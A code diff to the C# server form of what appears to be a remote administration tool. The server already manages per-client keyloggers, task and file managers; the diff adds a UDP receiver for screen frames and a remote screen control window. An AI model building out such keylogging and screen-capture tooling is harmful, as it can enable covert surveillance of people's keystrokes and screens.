@@ -31,7 +31,9 @@ namespace Server.Forms
         private readonly Dictionary<string, KeyLoggerForm> _keyLoggerForms = new Dictionary<string, KeyLoggerForm>();
         private readonly Dictionary<string, Server.Handlers.KeyLoggerHandler> _keyLoggerHandlers = new Dictionary<string, Server.Handlers.KeyLoggerHandler>();
         private readonly TaskManagerHandler _taskManagerHandler = new TaskManagerHandler();
+        private readonly ScreenControlHandler _screenControlHandler = new ScreenControlHandler();
         private readonly CommandService _commandService = new CommandService();
+        private UdpScreenReceiver? _udpReceiver;
         private readonly BindingSource _clientsBinding = new BindingSource();
 
         public MainServerForm()
@@ -41,7 +43,9 @@ namespace Server.Forms
 				OnTaskManagerResponse,
 				onKeyLoggerEvent: OnKeyLoggerEvent,
                 onKeyLoggerBatch: OnKeyLoggerBatch,
-                onKeyLoggerComboEvent: OnKeyLoggerComboEvent);
+                onKeyLoggerComboEvent: OnKeyLoggerComboEvent,
+                onScreenControlResponse: OnScreenControlResponse,
+                onScreenControlFrame: OnScreenControlFrame);
             InitializeClientsGrid();
         }
 
@@ -109,7 +113,7 @@ namespace Server.Forms
             AppendLog($"[{DateTime.Now:HH:mm:ss}] [RECV] FileManagerResponse from {response.ClientId}");
         }
 
-        private void OnTaskManagerResponse (TaskManagerResponse response)
+		private void OnTaskManagerResponse (TaskManagerResponse response)
 		{
 			if (!string.IsNullOrEmpty(response.ClientId))
 			{
@@ -123,6 +127,28 @@ namespace Server.Forms
 			AppendLog($"[{DateTime.Now:HH:mm:ss}] [RECV] TaskManagerResponse from {response.ClientId}");
 		}
 
+        private void OnScreenControlResponse(ScreenControlResponse response)
+        {
+            if (!string.IsNullOrEmpty(response.ClientId))
+            {
+                _screenControlHandler.SaveLastResponse(response.ClientId, response);
+            }
+            AppendLog($"[{DateTime.Now:HH:mm:ss}] [RECV] ScreenControlResponse from {response.ClientId}");
+        }
+
+        private void OnScreenControlFrame(ScreenControlFrame frame)
+        {
+            if (!string.IsNullOrEmpty(frame.ClientId))
+            {
+                Console.WriteLine($"[Server] Received frame {frame.Frame.FrameNumber} from {frame.ClientId}, size: {frame.Frame.ImageData.Length} bytes");
+                _screenControlHandler.SaveFrame(frame.ClientId, frame);
+            }
+            else
+            {
+                Console.WriteLine("[Server] Received frame with empty ClientId");
+            }
+        }
+
 		private void StartServer(int port)
         {
             _listener = new ServerListener(IPAddress.Any, port);
@@ -135,8 +161,12 @@ namespace Server.Forms
                 RefreshClientsGrid();
             };
             _listener.Start();
+            // Start UDP receiver on a fixed port (can be made dynamic)
+            var udpPort = 50050;
+            _udpReceiver = new UdpScreenReceiver(udpPort);
+            _udpReceiver.OnFrame += (s, f) => OnScreenControlFrame(f);
             lblStatus.ForeColor = Color.Green;
-            lblStatus.Text = $"Server running on port {port}";
+            lblStatus.Text = $"Server running on TCP {port} / UDP {udpPort}";
             AppendLog($"[{DateTime.Now:HH:mm:ss}] [INFO] Listening on port {port}");
             btnStartStop.Text = "Stop Server";
         }
@@ -145,6 +175,8 @@ namespace Server.Forms
         {
             _listener?.Stop();
             _clients.Clear();
+            _udpReceiver?.Dispose();
+            _udpReceiver = null;
             lblStatus.ForeColor = Color.Red;
             lblStatus.Text = "Server stopped";
             btnStartStop.Text = "Start Server";
@@ -437,6 +469,16 @@ namespace Server.Forms
 			taskManagerForm.Show();
 			AppendLog($"[{DateTime.Now:HH:mm:ss}] [INFO] Opened Task Manager for {conn.Id}");
 		}
+
+        private void screenControlToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            var conn = GetSelectedConnection();
+            if (conn == null) return;
+
+            var screenControlForm = ScreenControlForm.CreateNewOrGetExisting(conn, _screenControlHandler);
+            screenControlForm.Show();
+            AppendLog($"[{DateTime.Now:HH:mm:ss}] [INFO] Opened Screen Control for {conn.Id}");
+        }
 
 		private void OpenIfCached(string clientId, bool hardware = false, bool software = false, bool network = false)
         {
